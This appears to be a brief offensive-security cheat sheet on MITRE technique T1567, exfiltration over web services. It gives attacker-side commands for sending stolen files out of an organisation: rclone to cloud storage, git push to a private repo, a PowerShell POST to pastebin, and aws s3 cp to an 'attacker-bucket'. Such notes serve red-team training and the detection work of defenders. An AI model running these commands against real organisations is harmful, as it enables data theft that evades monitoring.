---
title: Exfiltration Over Web Service
tags: [exfiltration, cloud, google-drive, s3, dropbox]
description: Uploading stolen data to legitimate external web services.
date: 2024-01-02
---

# Exfiltration Over Web Service (T1567)

"Why is the CEO uploading 5GB to Google Drive?" "Probably a backup."

## 1. Cloud Storage (Google Drive / OneDrive / Dropbox)
If the organization uses G-Suite, uploading to *your* personal Google Drive looks like normal traffic.
- **Tool**: `rclone`.
  ```bash
  rclone copy C:\Sensitive remote:backup
  ```

## 2. Code Repositories (GitHub)
Pushing data as code.
- **Technique**: Create a private repo. `git add confidential.pdf; git push`.

## 3. Paste Sites
For small data (dumps).
- **Text**: `Invoke-RestMethod -Uri https://pastebin.com/api... -Method Post -Body $data`

## 4. S3 Buckets
- **Command**: `aws s3 cp data.zip s3://attacker-bucket/` (Requires AWS CLI or careful HTTP crafting).
